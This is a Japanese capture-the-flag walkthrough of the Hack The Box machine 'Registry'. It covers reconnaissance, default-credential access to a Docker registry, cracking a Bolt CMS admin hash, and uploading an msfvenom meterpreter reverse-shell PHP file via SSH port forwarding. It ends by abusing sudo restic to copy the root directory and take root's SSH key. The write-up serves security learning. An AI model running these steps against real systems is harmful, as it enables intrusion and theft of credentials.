このマシンのIPアドレスは10.10.10.159で、/ etc / hostsに追加します。

10.10.10.159    registry.htb

まず、開いているポートをスキャンします。nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。tun0インターフェースからすべてのTCPおよびUDPポートを毎秒1000パケットの速度でスキャンします。

masscan -e tun0 -p1-65535,U:1-65535 10.10.10.159 --rate=1000



ここで、ポートで動作するサービスの詳細については、-Aオプションを指定してスキャンを実行します。

nmap -A registry.htb -p22,80,443



ホストには3つのポートが開いていますが、証明書（ポート443）はdocker.registry.htb用です。/ etc / hostsにも追加します。registry.htbに

10.10.10.159    docker.registry.htb

切り替えると、nginxプロンプトが表示され、docker.registry.htbには空白のページが表示されます。 gobusterを使用してディレクトリを反復処理してみましょう。パラメータには、128（-t）、URL（-u）、ディクショナリ（-w）、および関心のある拡張機能（-x）のストリーム数を示します。



gobuster dir -t 128 -u registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php



Backup.phpからは何も得られません。boltにはCMS Boltのサイトがあり、インストール時にはファイルがいくつかあります。ダウンロードしてください。

wget http://registry.htb/install/ -O ind

そして、それがどのようなファイルであるかを調べます。



「gzip圧縮データ」をすぐに読むことができます。



この方法で証明書を取得し、Dockerのリファレンスドキュメントにリンクします。
別のドメインの場合は、-kオプションを追加して、証明書の検証をスキップします。

gobuster dir -t 128 -k -u docker.registry.htb:443 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php



次に、v2ディレクトリに移動してみましょう。認証が完了しました。



そして最も単純な組み合わせの管理者：管理者は私たちにアクセス権を与えます。ホストはdocker regisrtyを実行するため、以下の説明から次のように、次のアドレスにあるリポジトリーを調べます：docker.registry.htb / v2 / _catalog。



そして、1つのリポジトリを見つけます。



Dockerをインストールして、証明書のインストールドキュメントを見てみましょう。



/ etc / dockerディレクトリに移動し、アーカイブから証明書を追加します。

sudo mkdir -p "certs.d/docker.registry.htb:443"
sudo nano certs.d/docker.registry.htb\:443/ca.crt
sudo chmod 0600 certs.d/docker.registry.htb:443/ca.crt



次に、Dockerにログインします。



ここで画像をロードします。

sudo docker pull docker.registry.htb:443/bolt-image:latest



そしてそれを実行します。

sudo docker run -it docker.registry.htb:443/bolt-image:latest

そして、最初に見るのはSSHです。幸いにも、キーと設定があり、そこから、ユーザーがボルトであることが明らかになります。



ただし、鍵は暗号化されているということです。これは、接続時にパスワードを要求することを意味します。その結果、ファイル内で文字列「pass」が検索されます。

grep -i -r "pass" ./etc/



このスクリプトは、キーを復号化するためのパスワードを要求します。そして、答えはそれに与えられています。



sshを使用してキーに接続します。



ホストにbackup.phpファイルがありました。その内容を見てみましょう。



これがsudoの使用方法で、明らかにパスワードなしです。しかし、boltにはパスワードが必要です。



つまり、サービスユーザーを取得する必要があります。CMS Boltを使用しているため、sqliteデータベースにアクセスできます。ダウンロードしてください。

scp -i bolt_key bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db ./

データベースを使い始めましょう。

sqlite3 bolt.db

テーブルを見てみましょう。



そして、bolt_usersテーブルからエントリを取得します。



したがって、管理者ハッシュがあります。 JTRを使用して繰り返します。



次に、管理者としてBoltにログインします。そして、バージョン3.6.4を観察します。



このバージョンにはエクスプロイトがあります。



脆弱性は、ダウンロードに必要なファイル拡張子を構成に追加し、ファイルをアップロードできることです。負荷のあるphpファイルを作成してみましょう（前もって言っておきますが、逆方向に接続しても機能しなかったため、4321ポートが転送されました:) ssh -i ./bolt_key bolt@registry.htb -R:432:10.0.0.0:4321。

msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4321 -f raw > r.php
cat r.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n' > r.php && xclip -selection clipboard -o >> r.php

そして、リスナーを実行します。



設定->メイン設定に行き、ファイルをダウンロードできるようにphp拡張を追加しましょう。



次に、[ファイル管理]-> [ファイルのアップロード]に移動して、ファイルを追加します。アクセスすると、接続が表示されます。



bashシェルを起動すると、サービスユーザーに代わって作業していることもわかります。



sudoを確認し、backup.phpからのコマンドがパスワードなしでsudoで実行できることを確認します。



ResticはGolangで書かれたバックアッププログラムです。 sudoでバックアップを作成できるため、ルートディレクトリ全体をコピーできます。まず、8000ポートを通過しましょう。

ssh -i ./bolt_key bolt@registry.htb -R:8000:0.0.0.0:8000

rest-serverをインストールして実行します（認証なしの8000ポスト上）。



バックアップを接続して初期化しましょう（restr1）。



次に、ルートディレクトリをバックアップします。



バックアップはローカルマシンに保存されました。保存されているすべてのファイルを見てみましょう。SSHキーを見つけます。

restic -r /tmp/restic/restr1/ ls latest



それを復元します。



接続する
